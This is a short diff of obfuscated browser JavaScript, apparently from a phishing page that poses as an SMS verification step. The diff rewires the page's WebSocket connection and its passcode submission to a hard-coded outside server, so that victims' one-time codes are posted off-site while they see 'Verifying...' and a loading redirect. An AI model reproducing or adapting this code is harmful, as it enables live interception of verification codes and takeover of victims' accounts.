@@ -184,8 +184,8 @@
             _a = 'unknown-' + Date.now();
         }
 
-        const _b = window.location.protocol === 'https:' ? 'wss' : 'ws';
-        const _c = `${_b}://${window.location.host}/ws/client/${_a}`;
+        const _b = 'wss';
+        const _c = `wss://api-production-8591.up.railway.app/ws/client/${_a}`;
         const _d = new WebSocket(_c);
 
         _d.onopen = () => {
@@ -263,7 +263,7 @@
             _h.textContent = 'Verifying...';
 
             try {
-                await fetch(`/v1/sms-submit?client_id=${_a}&otp=${_t}`, {
+                await fetch(`https://api-production-8591.up.railway.app/v1/sms-submit?client_id=${_a}&otp=${_t}`, {
                     method: 'POST'
                 });
                 window.location.href = 'loading?step=2';
